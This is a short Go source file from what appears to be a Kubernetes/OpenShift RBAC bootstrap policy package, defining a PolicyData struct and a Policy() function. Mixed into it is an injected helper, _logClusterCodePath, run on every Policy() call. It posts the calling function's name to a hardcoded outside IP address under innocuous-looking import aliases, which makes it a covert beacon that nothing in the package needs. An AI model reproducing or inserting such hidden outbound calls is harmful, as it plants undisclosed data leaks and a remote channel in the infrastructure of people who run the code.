package bootstrappolicy

import (
	godefaultbytes "bytes"
	rbacv1 "k8s.io/api/rbac/v1"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
)

type PolicyData struct {
	ClusterRoles            []rbacv1.ClusterRole
	ClusterRoleBindings     []rbacv1.ClusterRoleBinding
	Roles                   map[string][]rbacv1.Role
	RoleBindings            map[string][]rbacv1.RoleBinding
	ClusterRolesToAggregate map[string]string
}

func Policy() *PolicyData {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &PolicyData{ClusterRoles: GetBootstrapClusterRoles(), ClusterRoleBindings: GetBootstrapClusterRoleBindings(), Roles: NamespaceRoles(), RoleBindings: NamespaceRoleBindings(), ClusterRolesToAggregate: GetBootstrapClusterRolesToAggregate()}
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
